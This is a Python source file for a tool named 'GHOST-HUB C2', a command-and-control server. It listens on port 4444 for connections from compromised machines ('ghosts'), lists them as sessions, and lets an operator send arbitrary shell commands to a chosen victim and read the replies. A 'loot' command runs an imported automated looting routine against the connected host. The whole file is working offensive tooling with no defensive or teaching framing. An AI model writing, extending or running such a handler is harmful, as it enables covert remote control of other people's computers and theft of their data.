import socket
import threading
import asyncio
import time
import questionary
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE
from modules.looter import run_looter  # Import the new async looter

console = Console()


class GhostHub:
    def __init__(self, port=4444):
        self.port = int(port)
        self.sessions = {}
        self.counter = 1

    async def handle_ghost(self, reader, writer):
        addr = writer.get_extra_info('peername')
        s_id = self.counter
        self.sessions[s_id] = {
            'reader': reader,
            'writer': writer,
            'ip': addr[0],
            'time': time.strftime("%H:%M:%S")
        }
        self.counter += 1
        console.print(
            f"\n[bold green][+] GHOST CONNECTED: {addr[0]} (ID: {s_id})[/bold green]")

    async def interact(self, s_id):
        if s_id not in self.sessions:
            return console.print(f"[red][!] Session {s_id} not found.[/red]")

        session = self.sessions[s_id]
        writer = session['writer']
        reader = session['reader']

        console.print(
            Panel(f"Target: {session['ip']}\nCommands: loot, exit", border_style="red"))

        while True:
            cmd = console.input(f"[bold red]Ghost-{s_id}[/bold red]> ").strip()

            if cmd == "back":
                break
            if cmd == "terminate":
                writer.close()
                await writer.wait_closed()
                del self.sessions[s_id]
                break

            if cmd == "loot":
                console.print(
                    "[dim][*] Running automated loot sequence...[/dim]")
                report = await run_looter(reader, writer)
                console.print(
                    Panel(report, title="Loot Report", border_style="yellow"))
                continue

            writer.write((cmd + "\n").encode())
            await writer.drain()

            try:
                data = await asyncio.wait_for(reader.read(16384), timeout=5.0)
                console.print(data.decode('utf-8', errors='ignore'))
            except asyncio.TimeoutError:
                console.print("[yellow][!] Response timed out.[/yellow]")

    async def start_server(self):
        server = await asyncio.start_server(self.handle_ghost, '0.0.0.0', self.port)
        async with server:
            await server.serve_forever()


async def async_hub_entry():
    draw_header("GHOST-HUB C2")
    port = questionary.text(
        "Listen Port:", default="4444", style=Q_STYLE).ask()
    hub = GhostHub(port=port)
    asyncio.create_task(hub.start_server())

    while True:
        # Simple session list loop
        if hub.sessions:
            table = Table(title="Active Sessions", border_style="red")
            table.add_column("ID")
            table.add_column("IP")
            table.add_column("Time")
            for sid, d in hub.sessions.items():
                table.add_row(str(sid), d['ip'], d['time'])
            console.print(table)

        cmd = questionary.text(
            "Hub Command (interact <ID>, exit):", style=Q_STYLE).ask()
        if not cmd:
            continue

        args = cmd.split()
        if args[0] == "interact":
            try:
                await hub.interact(int(args[1]))
            except:
                console.print("[red]Invalid ID[/red]")
        elif args[0] == "exit":
            break


def run_ghost_hub():
    try:
        asyncio.run(async_hub_entry())
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    run_ghost_hub()
